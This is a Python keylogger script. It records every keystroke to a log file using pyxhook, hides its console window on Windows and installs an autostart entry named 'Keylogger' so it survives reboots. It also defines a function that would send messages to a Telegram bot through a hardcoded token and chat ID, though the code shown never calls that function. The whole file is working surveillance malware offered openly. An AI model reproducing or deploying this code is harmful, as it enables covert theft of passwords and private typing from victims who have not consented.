# import needed modules
import os
import sys
import subprocess
import time
from datetime import datetime
import pyxhook
import requests

# Telegram bot credentials
telegram_token = "6285163091:AAEPDAZtSIccvzn8a-wnSI_As89Qh5Kdfvs"
chat_id = "1306881762"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
    data = {"chat_id": chat_id, "text": message}
    requests.post(url, data=data)

def main():
    # Specify the name of the file (can be changed )
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'

    # The logging function with {event parm}
    def OnKeyPress(event):
        with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
            if event.Key == 'P_Enter':
                f.write('\n')
            else:
                f.write(f"{chr(event.Ascii)}")  # Write to the file and convert ascii to readable characters

    # Create a hook manager object
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress

    new_hook.HookKeyboard()  # set the hook

    try:
        new_hook.start()  # start the hook
    except KeyboardInterrupt:
        # User cancelled from command line so close the listener
        new_hook.cancel()
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = f"Error while catching events:\n  {ex}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")

def hide_console():
    # Hide the console window on Windows
    if os.name == 'nt':
        import win32console
        import win32gui
        win32console.GetConsoleWindow()
        win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)

def add_to_startup():
    # Add the script to startup
    startup_file = os.path.expanduser("~/.config/autostart/keylogger.desktop")
    with open(startup_file, "w") as f:
        f.write("[Desktop Entry]\n")
        f.write("Type=Application\n")
        f.write(f"Exec=python3 {os.path.realpath(__file__)}\n")
        f.write("Hidden=false\n")
        f.write("NoDisplay=false\n")
        f.write("X-GNOME-Autostart-enabled=true\n")
        f.write("Name[en_US]=Keylogger\n")
        f.write("Name=Keylogger\n")
        f.write("Comment=Start keylogger at system startup\n")

if __name__ == "__main__":
    hide_console()
    add_to_startup()
    main()
